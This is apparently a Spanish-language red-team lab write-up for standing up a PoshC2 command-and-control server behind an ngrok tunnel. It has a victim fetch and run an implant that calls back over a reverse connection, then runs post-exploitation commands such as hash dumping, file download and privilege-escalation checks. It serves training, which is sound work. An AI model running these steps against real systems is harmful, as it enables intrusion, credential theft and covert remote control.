## Lab3: C2 - PoshC2

**Descripción**

El laboratorio tiene por objetivo, establecer un Centro de Comando y Control (C2) basado en PoshC2, ejecutar comandos de obtención de información post explotación 

- Para el desarrollo del laboratorio se requiere que el participante instale el PoshC2 siguiendo las indicaciones o desde la página oficial: https://poshc2.readthedocs.io/en/latest/
- Como víctima, se debe crear una instancia en AWS con sistema operativo Windows7 o Windows Server 2012R2 y estar dentro del dominio RTOOS.NET. **La instancia debe estar conectado a la vpn pública.**


### SOLUCIÓN:

- Instalar PoshC2 en el equipo que ejecuta Kali Linux mediante la siguiente línea de comandos :

   ```
   curl -sSL https://raw.githubusercontent.com/nettitude/PoshC2/master/Install.sh | sudo bash
   ```
   
- Instalar las dependiencias y configurar lo necesario para ejecutar el C2
- Algunas confguraciones complementarias:
   ```  
   export PYTHONPATH=/usr/local/lib/python.38/dist-packages/
   ```
   
  Para el error de apy_pkg
    ```
    cd  /usr/lib/python3/dist-packages
    ls -la /usr/lib/python3/dist-packages
    sudo cp apt_pkg.cpython-36m-x86_64-linux-gnu.so apt_pkg.so
    ```
    
  Para el dotnet
    
    ```
    wget http://ftp.us.debian.org/debian/pool/main/i/icu/libicu57_57.1-6+deb9u4_amd64.deb
    sudo dpkg -i libicu57_57.1-6+deb9u4_amd64.deb
    sudo apt install dotnet-sdk-2.2
    
    $ dotnet --version
    ```
    
- Cuando todo esté instalado correctamente, confgurar el servidor C2, considerando ngrok como proxy o tunnel 
- En el parametro PayloadCommsHost se deberá  reemplazar por la url de ngrok
   ```
   # ngrok http 8080
   ```
      
- Para configurar el PoshC2 ejecutar: `posh-config`

  Ejemplo de configuración de PoshC2:

```
  # These options are loaded into the database on first run, changing them after
  # that must be done through commands (such as set-defaultbeacon), or by
  # creating a new project

  # Server Config
  BindIP: '0.0.0.0'
  BindPort: 8080

  # Database Config
  DatabaseType: "SQLite" # or Postgres
  PostgresConnectionString: "dbname='poshc2_project_x' port='5432' user='admin' host='192.168.111.111' password='XXXXXXX'" # Only used if Postgres in use

  # Payload Comms
  PayloadCommsHost: "http://f3a1-2001-1388-70c5-cc21-cd1d-168c-c3ae-7880.ngrok.io" # "https://www.domainfront.com:443,https://www.direct.com"
  DomainFrontHeader: ""  # "axpejfaaec.cloudfront.net,www.direct.com"
  Referrer: ""  # optional
  ServerHeader: "Apache"
  UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36"  # This should be updated to match the environment, this is Chrome on 2020-03-2

  DefaultSleep: "5s"
  Jitter: 0.20
  KillDate: "2999-12-01"  # yyyy-MM-dd
  UrlConfig: "urls" # Beacon URLs will be taken from resources/urls.txt if value is 'urls'. If value is 'wordlist' beacon URLs will be randomly generated on server creation from resources/wordlist.txt

  # Payload Options
  PayloadStageRetries: true
  PayloadStageRetriesInitialWait: 60 # Stager will retry after this many seconds, doubling the wait each time if it fails
  PayloadStageRetriesLimit: 30 # Stager retry attempts before failing
  DefaultMigrationProcess: "C:\\Windows\\system32\\netsh.exe"  # Used in the PoshXX_migrate.exe payloads
  PayloadDomainCheck: "" # If non-empty then the UserDomain on the target will be checked and if it 'contains' this value then the payload will execute, else it will not.

  # Notifications Options
  NotificationsProjectName: "PoshC2"
  EnableNotifications: "No"

  # Pushover - https://pushover.net/
  Pushover_APIToken: ""
  Pushover_APIUser: ""

  # Slack - https://slack.com/
  Slack_BotToken: "" # The token used by the application to authenticate. Get it from https://[YourSlackName].slack.com/apps/A0F7YS25R (swap out [YourSlackName]). Should start with xobo-.
  Slack_UserID: "" # Found under a users profile (i.e UHEJYT2AA). Can also be "channel". 
  Slack_Channel: "" # i.e #bots

  # SOCKS Proxying Options
  SocksHost: "http://127.0.0.1:49031"

  # PBind Options
  PBindPipeName: "jaccdpqnvbrrxlaf"
  PBindSecret: "mtkn4"

  # FComm Options
  FCommFileName: "C:\\Users\\Public\\Public.ost"
```

- En una ventana de terminal ejecutar el servidor : 
     ```
     posh-server
     ```
     
- En otra ventana o pestaña de terminal ejecute el cliente o Implant Manager : 
     ```
     posh
     ```
     
  Le solicitará colocar un nombre de usuario.


- Para efectos de este laboratorio, el instructor ejecutará un payload que permitirá desplegar un implante que generará una conexión reversa hacia el PoshC2 Server o el participante puede tener acceso al host victima para realizar la transferncia del implante.

- Una alternativa para la transferencia del payload es utilizar un servidor web creado en la carpeta donde se almacenan los implantes (/opt/PoshC2_Project/payloads) :

```
    python -m SimpleHTTPServer 80
```
  	
- De forma ordenada, el participante deberá comunicar al instructor su dirección IP para que él descargue y ejecute el payload desde la maquina victima. De esta forma, recibirá una conexión reversa en su PoshC2 Server y tendrá su primer implante establecido.

- Otra opción es ejecutar el comando de powershell en base 64.

- En el Implant Handler y en la consola del C2 Server se podrá ver la información del implante que se ha conectado y esta disponible.

- Para interactuar con ese implante desde el Implant Handler, seleccionar el implante por su ID (verifique que sea el que corresponda al mismo que apareció en la consola del C2 Server).

- Ejecute algunos o todos los siguientes comandos además del comando help que le permitirá conocer lo que incluye Posch C2 Server por default :

```
    ls
    pwd
    get-implantworkingdirectory
    cd c:\users\xxxx 
    download-file Tropheo.txt
    get-computerinfo
    get-netstat
    get-pid
    ps
    find-allvulns
    invoke-allchecks
    get-MpPreference
    Get-LocalGroupMember Administrators
    get-hash
    loadmodule SeatBealt.ps1
    seatbelt
```
    
- Antes de culminar, vuelva al primer nivel del Implant Manager para obtener información del C2 Server y un reporte de actividades :

```
    back
    show-serverinfo
    generate-reports
```
    


*============FIN DE DOCUMENTO===============*




